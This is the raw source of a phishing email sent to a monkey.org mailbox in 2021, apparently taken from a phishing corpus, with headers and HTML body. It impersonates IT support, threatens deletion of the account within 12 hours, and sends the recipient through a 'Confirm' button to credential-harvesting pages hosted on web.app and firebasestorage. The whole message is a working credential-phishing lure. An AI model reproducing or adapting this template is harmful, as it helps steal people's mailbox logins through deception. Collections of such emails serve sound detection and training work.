@@ -1,0 +1,177 @@
+Return-Path: noreply@ariannteemail.cam
+Delivered-To: jose@monkey.org
+X-FDA: 78183176904.05.3DEE9E5
+Received: from ariannteemail.cam (server.ariannteemail.cam [195.242.110.32])
+	by imf13.b.hostedemail.com (Postfix) with ESMTP id 1E644180C621F
+	for <jose@monkey.org>; Wed, 26 May 2021 11:35:31 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed;
+	d=ariannteemail.cam; s=default; h=From:To:Subject:MIME-Version:
+	Content-Type:Content-Transfer-Encoding; bh=5JW4T1WHzdytiuCyC3mTF
+	6wo9UY=; b=e19dLLIbp/FJo109lMiZ6gksXTr8pREXhwqHtjZM/CYpQvyq4zG87
+	OK3fH7Fz6NIRABgnUwUY5/ETqm4mjdymG+l3f1mxIRI/DaJqUmZLbcDyCiFIaWPx
+	7tMsTBNXTgIEZQHOeeyc9yWcLSRkjaxixVTpMNyuTTYqUzyAXD0654=
+From: Supportmonkey.org <noreply@ariannteemail.cam>
+To: jose@monkey.org
+Subject: Validation Error For:  jose@monkey.org Webmail  (Mailbox)
+ Re-validation Required
+Date: 26 May 2021 11:35:31 -0700
+Message-ID: <20210526113531.775243B53CD5844E@ariannteemail.cam>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=3.46
+Authentication-Results: imf13.b.hostedemail.com;	dkim=pass
+ header.d=ariannteemail.cam header.s=default header.b=e19dLLIb;	spf=pass
+ (imf13.b.hostedemail.com: domain of noreply@ariannteemail.cam designates
+ 195.242.110.32 as permitted sender) smtp.mailfrom=noreply@ariannteemail.cam;
+	dmarc=pass (policy=none) header.from=ariannteemail.cam
+X-Stat-Signature: 1nngsbidns7mba3hteorq3itet3taob4
+X-Rspamd-Queue-Id: 1E644180C621F
+X-Rspamd-Server: rspam01
+X-HE-Tag: 1622028931-646613
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 37
+
+<!DOCTYPE html><html>
+
+<html><head>
+    <meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3D">
+    <meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19867">
+    <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+  </head>
+  <body text=3D"#000000" bgcolor=3D"#ffffff">
+    <table width=3D"100%" align=3D"center" style=3D"margin: 5px auto; borde=
+r-collapse: collapse; max-width: 620px; border-spacing: 0px;" border=3D"0" =
+cellspacing=3D"0" cellpadding=3D"0">
+      <tbody>
+        <tr>
+          <td style=3D"margin: 0px; font-family: Roboto,RobotoDraft,Helveti=
+ca,Arial,sans-serif; border-collapse: collapse;">
+            <table width=3D"100%" style=3D"border: 1px solid rgb(204, 204, =
+204); border-image: none; border-collapse: collapse; border-spacing: 0px; b=
+ackground-color: rgb(228, 228, 228);" border=3D"0" cellspacing=3D"0" cellpa=
+dding=3D"0">
+              <tbody>
+                <tr height=3D"32">
+                  <td width=3D"32" align=3D"left" valign=3D"middle" style=
+=3D"margin: 0px; padding-right: 15px; padding-left: 15px; font-family: Robo=
+to,RobotoDraft,Helvetica,Arial,sans-serif; border-collapse: collapse;">
+                    <br>
+                    <br>
+                    <br>
+                  </td>
+                  <td align=3D"left" valign=3D"middle" style=3D'margin: 0px=
+; font-family: "Symantec Sans"; font-size: 16px; border-collapse: collapse;=
+'>
+                    <font style=3D"vertical-align: inherit;"><font style=3D=
+"vertical-align: inherit;"><span class=3D"il">Server</span>
+                        Administrator |&nbsp;IT Support</font></font><br>
+                  </td>
+                </tr>
+                <tr height=3D"3" style=3D"padding-left: 15px;">
+                  <td style=3D"margin: 0px; font-family: Roboto,RobotoDraft=
+,Helvetica,Arial,sans-serif; border-collapse: collapse;">
+                    <br>
+                  </td>
+                  <td style=3D"margin: 0px; font-family: Roboto,RobotoDraft=
+,Helvetica,Arial,sans-serif; border-collapse: collapse;">
+                    <br>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+            <table width=3D"100%" style=3D"border: 1px solid rgb(204, 204, =
+204); border-image: none; border-collapse: collapse; border-spacing: 0px; b=
+ackground-color: rgb(255, 255, 255);" bgcolor=3D"#ffffff" border=3D"0" cell=
+spacing=3D"0" cellpadding=3D"0">
+              <tbody>
+                <tr>
+                  <td style=3D"margin: 0px; padding: 0px 15px; line-height:=
+ 27px; font-family: Calibri; font-size: 13px; border-collapse: collapse; ba=
+ckground-color: rgb(236, 243, 249);">
+<b><font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: =
+inherit;">Dear jose,</font></font></b></td>
+                </tr>
+                <tr>
+                  <td style=3D"margin: 0px; padding: 0px 15px 5px; line-hei=
+ght: 27px; font-family: Calibri; font-size: 13px; border-collapse: collapse=
+; background-color: rgb(236, 243, 249);">
+                    <table width=3D"100%" style=3D"font-family: Arial,Helve=
+tica,sans-serif; font-size: small;" border=3D"0" cellspacing=3D"0" cellpadd=
+ing=3D"0">
+                      <tbody>
+                        <tr style=3D"color: rgb(64, 64, 64); line-height: 2=
+6px;">
+                          <td style=3D"margin: 0px; font-family: Roboto,Rob=
+otoDraft,Helvetica,Arial,sans-serif;">
+                            <p><font style=3D"vertical-align: inherit;"><fo=
+nt style=3D"vertical-align: inherit;">We are
+                                  closing all old versions and non-active u=
+sers from 5/26/2021 11:35:31 a.m.. Please confirm your
+                                  <span class=3D"il">email</span> address&n=
+bsp;jose@monkey.org to keep your account
+                                  from being deactivated.</font></font></p>=
+
+                          </td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </td>
+                </tr>
+                <tr>
+                  <td width=3D"300" align=3D"left" style=3D"margin: 0px; pa=
+dding: 10px; font-family: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; bo=
+rder-collapse: collapse;">
+                    <a style=3D'margin: 0px; padding: 14px 7px; border-radi=
+us: 4px; width: 210px; text-align: center; color: white; font-family: "Open=
+ Sans","Helvetica Neue",Arial; font-size: 15px; display: block; max-width: =
+210px; background-color: darkblue; text-decoration-line: none;' href=3D"htt=
+ps://sabalimgbaja56.web.app/emailverfificationneededinyourserver_supportser=
+ver_action_required_hfjeicjeice.html#jose@monkey.org" target=3D"_self" rel=
+=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://firebasestor=
+age.googleapis.com/v0/b/hrodsdf.appspot.com/o/general-hash.html?alt%3Dmedia=
+%26token%3D0638d697-ab4a-466a-b8b2-c80294d46f14%23m.maleki@semg.ir&amp;sour=
+ce=3Dgmail&amp;ust=3D1613423944849000&amp;usg=3DAFQjCNE8cPTEE1tYmS4RkLNnw04=
+m_YNlCg" moz-do-not-send=3D"true" data-saferedirectreason=3D"5"><font style=
+=3D"vertical-align: inherit;"><font style=3D"vertical-align: inherit;">Conf=
+irm</font></font></a></td>
+                </tr>
+                <tr>
+                  <td style=3D"margin: 0px; padding: 5px 15px; line-height:=
+ 0; font-family: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; font-size: =
+0px; border-collapse: collapse;">
+                    &nbsp;</td>
+                </tr>
+                <tr style=3D"margin-top: 10px; background-color: rgb(228, 2=
+28, 228);">
+                  <td style=3D"margin: 0px; padding: 10px 15px; line-height=
+: 20px; font-family: Calibri; font-size: 13px; border-collapse: collapse;">=
+
+                    <p><font style=3D"vertical-align: inherit;"><font style=
+=3D"vertical-align: inherit;">Account will be&nbsp;
+                          automatically deleted after 12 hours from 5/26/20=
+21 11:35:31 a.m.. You can change the frequency of these notifications
+                          within your mailbox portal.</font></font></p>
+                  </td>
+                </tr>
+                <tr align=3D"left" style=3D"padding: 0px 0px 10px 15px; mar=
+gin-top: 10px; background-color: rgb(228, 228, 228);">
+                  <td style=3D"margin: 0px; padding-top: 10px; padding-bott=
+om: 10px; padding-left: 15px; font-family: Roboto,RobotoDraft,Helvetica,Ari=
+al,sans-serif; border-collapse: collapse;">
+                    <br>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+=20=20
+
+</body></html>
+
